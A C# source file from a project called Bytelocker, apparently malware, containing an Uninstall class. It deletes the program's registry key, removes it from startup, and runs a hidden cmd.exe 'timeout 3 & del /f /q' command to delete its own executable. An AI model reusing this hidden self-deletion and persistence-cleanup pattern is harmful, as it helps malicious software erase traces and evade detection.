using Bytelocker.Settings;
using System;
using System.Diagnostics;

namespace Bytelocker.Installer
{
    class Uninstall
    {
        RegistryManager rm;

        public Uninstall()
        {
            this.rm = new RegistryManager();
            this.DeleteRegChanges();
            this.Delete();
            this.RemoveFromStartup();

            System.Environment.Exit(0);
        }

        private void DeleteRegChanges()
        {
            RegistryManager rm = new RegistryManager();
            rm.DeleteMainKey();
        }

        private void Delete()
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            String path = this.rm.getStartupPath(Persistence.REGISTRY_STARTUP_VALUE_NAME);

            if (path == "none")
            {
                psi.Arguments = "/C timeout 3 & del /f /q \"" + System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName + "\"";
            } else
            {
                psi.Arguments = "/C timeout 3 & del /f /q \"" + path + "\"";
            }

            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.FileName = "cmd.exe";

            Process.Start(psi);
        }

        private void RemoveFromStartup()
        {
            this.rm.RemoveFromStartup(Persistence.REGISTRY_STARTUP_VALUE_NAME);
        }
    }
}
